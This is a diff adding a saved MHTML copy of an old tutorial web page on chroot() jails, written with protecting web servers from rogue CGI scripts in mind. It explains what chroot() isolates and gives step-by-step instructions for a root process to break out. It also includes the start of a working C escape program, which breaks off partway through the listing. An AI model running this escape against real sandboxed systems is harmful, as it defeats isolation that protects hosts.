@@ -1,0 +1,1053 @@
+From: <Saved by Mozilla 5.0 (X11)>
+Subject: Breaking out of a chroot() padded cell
+Date: Tue, 10 Jan 2017 22:47:02 +0800
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----=_NextPart_000_0000_94135694.524684C0"
+X-MAF-Information: Produced By MAF V4.0.1rc
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_94135694.524684C0
+Content-Type: text/html;
+	charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: file:///home/andy/Documents/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot()%20padded%20cell.html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w=
+3.org/TR/REC-html40/loose.dtd"><!--                                      =
+                      --><!-- Auto generated at Sat May  7 11:13:48 2005 GM=
+T             --><!-- by a gaggle of scripts which call WML which uses some=
+ ipp, --><!-- meta-html and lots of eperl to generate the page you see.  --=
+><!-- Have a look at http://www.bpfh.net/about/                  --><!-- fo=
+r more details.                                          --><!--         =
+                                                   --><html><head>
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3Dwindows-1=
+252">
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3Dwindows-1=
+252">
+<title>Breaking out of a chroot() padded cell </title>
+<meta name=3D"generator" content=3D"vi">
+<meta name=3D"Keywords" content=3D"simes,BPFH,BOFH">
+</head>
+<body bgcolor=3D"#ffffff">
+<div align=3D"center">
+
+
+
+<!-- Begin navigation bar -->
+
+<table bgcolor=3D"#bfbfbf" border=3D"0" cellpadding=3D"4" cellspacing=3D"0"=
+ width=3D"100%"><tbody><tr><td valign=3D"top" align=3D"left">=A0<a href=3D"=
+http://www.bpfh.net/index/"><font size=3D"-1">[Index]</font></a>=A0<a href=
+=3D"http://www.bpfh.net/about/"><font size=3D"-1">[About]</font></a></td>
+    <th><font size=3D"+2">Simon's computing stuff</font></th>
+    <td valign=3D"top" align=3D"right"><table border=3D"0" cellpadding=3D"0=
+" cellspacing=3D"0">
+ <tbody><tr><td><font size=3D"-1"><a href=3D"http://www.bpfh.net/sitemap/au=
+thors/by-author/simes.html">Author</a>:=A0</font></td>
+     <td><font size=3D"-1"><strong><a href=3D"http://www.bpfh.net/simes/">S=
+imes</a></strong></font></td></tr>
+ <tr><td><font size=3D"-1">Created:=A0</font></td>
+     <td><font size=3D"-1">2002-05-12</font></td></tr>
+ <tr><td><font size=3D"-1">Last changed:=A0</font></td>
+     <td><font size=3D"-1">2002-05-12</font></td></tr>
+</tbody></table>
+</td></tr><tr><th colspan=3D"3"> <table border=3D"0" cellpadding=3D"0" cell=
+spacing=3D"0" width=3D"100%">
+    <tbody><tr><td align=3D"left"><a href=3D"http://www.bpfh.net/"><font si=
+ze=3D"-1">[Root]</font></a>=A0=A0<a href=3D"http://www.bpfh.net/simes/compu=
+ting/Bill_Cheswick_berferd.ps.gz"><font size=3D"-1">[Prev]</font></a>=A0<a=
+ href=3D"http://www.bpfh.net/simes/computing/"><font size=3D"-1">[Idx]</fon=
+t></a>=A0<a href=3D"http://www.bpfh.net/simes/computing/Bill_Cheswick_berfe=
+rd.ps.gz"><font size=3D"-1">[Next]</font></a></td>
+        <td align=3D"right"><font size=3D"-1">http://<a href=3D"http://www.=
+bpfh.net/">www.bpfh.net</a>/<a href=3D"http://www.bpfh.net/simes/">simes</a=
+>/<a href=3D"http://www.bpfh.net/simes/computing/">computing</a>/<a href=3D=
+"http://www.bpfh.net/simes/computing/chroot-break.html">chroot-break.html</=
+a></font>=A0</td></tr>
+    </tbody></table></th>
+</tr></tbody></table>
+
+<!-- End navigation bar -->
+
+
+<h1>How to break out of a <tt>chroot()</tt> jail</h1>
+</div>
+<!-- End header -->
+
+
+
+<!-- Begin content -->
+<p>
+This page details how the <tt>chroot()</tt> system call can be used to
+provide an additional layer of security when running untrusted programs. It
+also details how this additional layer of security can be circumvented.
+</p>
+
+<div align=3D"center"><h2><a name=3D"intro">An introduction to <tt>chroot()=
+</tt></a></h2></div>
+<p>
+<tt>chroot()</tt> is a Unix system call that is often used to provide an
+additional layer of security when untrusted programs are run. The kernel on
+Unix varients which support <tt>chroot()</tt> maintain a note of the root
+directory each process on the system has. Generally this is "<tt>/</tt>",=
+ but
+the <tt>chroot()</tt> system call can change this. When <tt>chroot()</tt>
+is successfully called, the calling process has its idea of the root direct=
+ory
+changed to the directory given as the argument to <tt>chroot()</tt>. For
+example after the following line of code, the process would see the directo=
+ry
+"<tt>/foo/bar</tt>" as its root directory.
+</p>
+
+<blockquote>
+<p><img src=3D"file:///home/andy/Documents/blog/reference/linux/container/B=
+reaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/top_divider.gif=
+" alt=3D"+------------------" border=3D"0" height=3D"10" width=3D"120"></p>
+<blockquote><pre>chdir("/foo/bar");
+chroot("/foo/bar");
+</pre></blockquote>
+<p><img src=3D"file:///home/andy/Documents/blog/reference/linux/container/B=
+reaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/bottom_divider.=
+gif" alt=3D"+------------------" border=3D"0" height=3D"10" width=3D"120"><=
+/p>
+<p>
+<table>
+<tbody><tr>
+ <th valign=3D"top">
+  Important:
+ </th>
+ <td>
+  When using <tt>chroot()</tt> in anger you need more than the above code;
+  <a href=3D"#notes">see below for details</a>.
+ </td>
+</tr>
+</tbody></table>
+</p>
+</blockquote>
+
+<p>
+Note the use of the <tt>chdir()</tt> call before the <tt>chroot()</tt> call.
+This is to ensure that the working directory of the process is within the
+<tt>chroot()</tt>ed area before the <tt>chroot()</tt> call takes place. This
+is due to most implementations of <tt>chroot()</tt> not changing the working
+directory of the process to within the directory the process is now
+<tt>chroot()</tt>ed in.
+</p>
+
+<p>
+This means that after the <tt>chroot()</tt> call, an
+<tt>open("/",O_RDONLY)</tt> would open the <strong>same</strong> directory
+as an <tt>open("/foo/bar",O_RDONLY)</tt> call before the <tt>chroot()</tt>.
+</p>
+<p>
+Due to the change in the root directory, the area which a <tt>chroot()</tt>=
+ed
+program lives in <strong>will</strong> require various files and programs=
+ for
+sane operation. For example, the following files are required for the sane
+operation of the basic shell interpreter <tt>sh</tt> within a
+<tt>chroot()</tt>ed environment.
+</p>
+<div align=3D"center"><p><table border=3D"">
+<tbody><tr><th>File</th><th>Usage</th></tr>
+<tr><td valign=3D"top"><tt>/bin/sh</tt></td>
+    <td>The binary for <tt>sh</tt></td></tr>
+<tr><td valign=3D"top"><tt>/usr/ld.so.1</tt></td>
+    <td>Dynamically link in the shared object libraries</td></tr>
+<tr><td valign=3D"top"><tt>/dev/zero</tt></td>
+    <td>Ensuring that the pages of memory used by shared objects are
+        clear</td></tr>
+<tr><td valign=3D"top"><tt>/usr/lib/libc.so.1</tt></td>
+    <td>The general C library</td></tr>
+<tr><td valign=3D"top"><tt>/usr/lib/libdl.so.1</tt></td>
+    <td>The dynamic linking access library</td></tr>
+<tr><td valign=3D"top"><tt>/usr/lib/libw.so.1</tt></td>
+    <td>Internationalisation library</td></tr>
+<tr><td valign=3D"top"><tt>/usr/lib/libintl.so.1</tt></td>
+    <td>Internationalisation library</td></tr>
+<tr><td valign=3D"top"><tt>/usr/platform/SUNW,Ultra-1/lib/libc_psr.so.1</tt=
+></td>
+    <td>"Processor Specific Runtime" - contains replacements for certain
+        library functions (<i>i.e.</i> <tt>memcpy</tt>) hand coded in faster
+        assembly.</td></tr>
+</tbody></table></p></div>
+
+<p>
+It should be noted that the more complex and larger a program gets, the more
+support files it will use. For example, <tt>perl</tt> requires a very
+large number of files and directories to work within a <tt>chroot()</tt>ed
+environment - 2610 files and 192 directories for a reasonable installation.
+</p>
+<p></p><hr noshade=3D"noshade"><p></p>
+
+<div align=3D"center"><h2><a name=3D"break">Breaking <tt>chroot()</tt></a><=
+/h2></div>
+<p>
+Whilst <tt>chroot()</tt> is reasonably secure, a program can escape from its
+trap. So long as a program is run with <tt>root</tt> (<i>ie</i> UID <tt>0</=
+tt>)
+privilages it can be used to break out of a <tt>chroot()</tt>ed area. For=
+ a
+user to do this, they would need access to:
+</p>
+
+
+<div align=3D"left"><blockquote><p></p><table border=3D"0">
+
+    <tbody><tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/a=
+ndy/Documents/blog/reference/linux/container/Breaking%20out%20of%20a%20chro=
+ot%28%29%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"1=
+4" width=3D"14"></td>
+      <td valign=3D"top" align=3D"left">    C compiler or a Perl interpreter
+ =20
+</td></tr>
+
+
+    <tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/andy/Doc=
+uments/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%2=
+9%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14" widt=
+h=3D"14"></td>
+      <td valign=3D"top" align=3D"left">    Security holes to gain root acc=
+ess
+ =20
+</td></tr>
+
+
+</tbody></table><p></p></blockquote></div>
+
+<p>
+It should be noted that this document was written with protecting web serve=
+rs
+from rogue CGI scripts in mind. Therefore it is not unreasonable to assume
+that a user has access to a Perl interpreter. It is then a matter for the
+user to gain root access via security holes on the box running the web
+server. Whilst this is outside the topic of the document, an attacker could
+make use of application programs which are <tt>setuid</tt>-root and have
+security holes within them. In a well maintained <tt>chroot()</tt> area such
+programs should not exist. However, it should be noted that maintaining a
+<tt>chroot()</tt>ed environment is a non-trival task, for example system
+patches which fix such security holes will not know about the copies of the
+programs within the <tt>chroot()</tt>ed area. Ensuring that there are no
+<tt>setuid</tt>-root executables within the padded cell is going to be a mu=
+st.
+</p>
+
+<p>
+To break out of a <tt>chroot()</tt>ed area, a program should do the followi=
+ng:
+</p>
+
+<blockquote>
+
+<div align=3D"left"><p></p><table border=3D"0">
+
+   <tbody><tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/an=
+dy/Documents/blog/reference/linux/container/Breaking%20out%20of%20a%20chroo=
+t%28%29%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14=
+" width=3D"14"></td>
+      <td valign=3D"top" align=3D"left">    Create a temporary directory in=
+ its current working directory
+=20
+</td></tr>
+
+
+   <tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/andy/Docu=
+ments/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29=
+%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14" width=
+=3D"14"></td>
+      <td valign=3D"top" align=3D"left">  <p>
+    Open the current working directory
+  </p>
+  <p>
+    <font size=3D"-1">
+      <strong>Note:</strong> only required if <tt>chroot()</tt> changes the
+      calling program's working directory.
+     </font>
+  </p>
+=20
+</td></tr>
+
+
+   <tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/andy/Docu=
+ments/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29=
+%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14" width=
+=3D"14"></td>
+      <td valign=3D"top" align=3D"left">    Change the root directory of th=
+e process to the temporary directory
+    using <tt>chroot()</tt>.
+=20
+</td></tr>
+
+
+   <tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/andy/Docu=
+ments/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29=
+%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14" width=
+=3D"14"></td>
+      <td valign=3D"top" align=3D"left">  <p>
+    Use <tt>fchdir()</tt> with the file descriptor of the opened directory
+    to move the current working directory outside the <tt>chroot()</tt>ed
+    area.
+  </p>
+  <p>
+    <font size=3D"-1">
+      <strong>Note:</strong> only required if <tt>chroot()</tt> changes the
+      calling program's working directory.
+     </font>
+  </p>
+=20
+</td></tr>
+
+
+   <tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/andy/Docu=
+ments/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29=
+%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14" width=
+=3D"14"></td>
+      <td valign=3D"top" align=3D"left">    Perform <tt>chdir("..")</tt> ca=
+lls many times to move the current working
+    directory into the <strong>real</strong> root directory.
+=20
+</td></tr>
+
+
+   <tr><td valign=3D"top" align=3D"left"><img src=3D"file:///home/andy/Docu=
+ments/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29=
+%20padded%20cell_files/ball.gif" alt=3D"*" border=3D"0" height=3D"14" width=
+=3D"14"></td>
+      <td valign=3D"top" align=3D"left">    Change the root directory of th=
+e process to the current working
+    directory, the <strong>real</strong> root directory, using
+    <tt>chroot(".")</tt>
+=20
+</td></tr>
+
+
+</tbody></table><p></p></div>
+</blockquote>
+
+<p>
+Once the above has been done, the program can run functions as required. A
+natural function would be to <tt>exec()</tt> a command interpreter like
+<tt>sh</tt> over the current program. The following C program is an example=
+ of
+the attack outlined above. A Perl version <strong>is</strong> possible,=20
+although it is not shown below.
+</p>
+
+<p>
+The following code is known to work under Solaris and
+Linux. It is likely to work under most (if not all) Unix
+varients which have the <tt>chroot()</tt> system call thanks to how it
+works<sup><a href=3D"#footnote-1">[1]</a></sup>.
+</p>
+
+<br>
+<div align=3D"center">
+<table border=3D"0" cellspacing=3D"0">
+<tbody><tr><th colspan=3D"2" bgcolor=3D"#bfbfbf" align=3D"left">Breaking <t=
+t>chroot()</tt></th></tr>
+
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">001=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;stdio.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">002=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;errno.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">003=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;fcntl.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">004=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;string.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">005=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;unistd.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">006=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;sys/stat.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">007=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#include=A0&lt;sys/types.h&gt;=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">008=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">009=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">010=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0You=A0should=A0set=A0NEED_FCHDIR=A0to=A01=A0if=A0the=A0chroot()=A0o=
+n=A0your=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">011=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0system=A0changes=A0the=A0working=A0directory=A0of=A0the=A0calling=
+=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">012=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0process=A0to=A0the=A0same=A0directory=A0as=A0the=A0process=A0was=A0=
+chroot()ed=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">013=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0to.=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">014=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">015=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0It=A0is=A0known=A0that=A0you=A0do=A0not=A0need=A0to=A0set=A0this=A0=
+value=A0if=A0you=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">016=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0running=A0on=A0Solaris=A02.7=A0and=A0below.=A0=A0</code></font></td=
+></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">017=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">018=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">019=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#define=A0NEED_FCHDIR=A00=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">020=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">021=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#define=A0TEMP_DIR=A0"waterbuffalo"=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">022=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">023=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0Break=A0out=A0of=A0a=A0chroot()=A0environment=A0in=A0C=A0*/=A0=A0</=
+code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">024=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">025=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0int=A0main()=A0{=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">026=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0int=A0x;=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0/*=A0Used=A0to=A0move=
+=A0up=A0a=A0directory=A0tree=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">027=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0int=A0done=3D0;=A0=A0=A0=A0=A0=A0=A0/*=A0Are=A0we=A0done=A0yet=A0?=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">028=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#ifdef=A0NEED_FCHDIR=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">029=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0int=A0dir_fd;=A0=A0=A0=A0=A0=A0=A0/*=A0File=A0descriptor=A0to=A0di=
+rectory=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">030=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#endif=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">031=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0struct=A0stat=A0sbuf;=A0/*=A0The=A0stat()=A0buffer=A0*/=A0=A0</cod=
+e></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">032=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">033=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">034=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0First=A0we=A0create=A0the=A0temporary=A0directory=A0if=A0it=A0doesn=
+'t=A0exist=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">035=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">036=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0if=A0(stat(TEMP_DIR,&amp;sbuf)&lt;0)=A0{=A0=A0</code></font></td><=
+/tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">037=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0if=A0(errno=3D=3DENOENT)=A0{=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">038=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0if=A0(mkdir(TEMP_DIR,0755)&lt;0)=A0{=A0=A0</code></fon=
+t></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">039=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0fprintf(stderr,"Failed=A0to=A0create=A0%s=A0-=A0=
+%s\n",=A0TEMP_DIR,=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">040=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0strerror(errno));=A0=A0<=
+/code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">041=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">042=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">043=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0}=A0else=A0{=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">044=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0fprintf(stderr,"Failed=A0to=A0stat=A0%s=A0-=A0%s\n",=
+=A0TEMP_DIR,=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">045=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0strerror(errno));=A0=A0</code>=
+</font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">046=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">047=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">048=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0else=A0if=A0(!S_ISDIR(sbuf.st_mode))=A0{=A0=A0</code></font></=
+td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">049=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0fprintf(stderr,"Error=A0-=A0%s=A0is=A0not=A0a=A0directory!\n=
+",TEMP_DIR);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">050=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">051=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">052=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">053=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#ifdef=A0NEED_FCHDIR=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">054=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">055=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0Now=A0we=A0open=A0the=A0current=A0working=A0directory=A0=A0</code><=
+/font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">056=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">057=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0Note:=A0Only=A0required=A0if=A0chroot()=A0changes=A0the=A0calling=
+=A0program's=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">058=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0=A0=A0=A0=A0=A0working=A0directory=A0to=A0the=A0directory=A0give=
+n=A0to=A0chroot().=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">059=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">060=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">061=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0if=A0((dir_fd=3Dopen(".",O_RDONLY))&lt;0)=A0{=A0=A0</code></font><=
+/td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">062=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0fprintf(stderr,"Failed=A0to=A0open=A0"."=A0for=A0reading=A0-=
+=A0%s\n",=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">063=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0strerror(errno));=A0=A0</code></font=
+></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">064=A0</td>
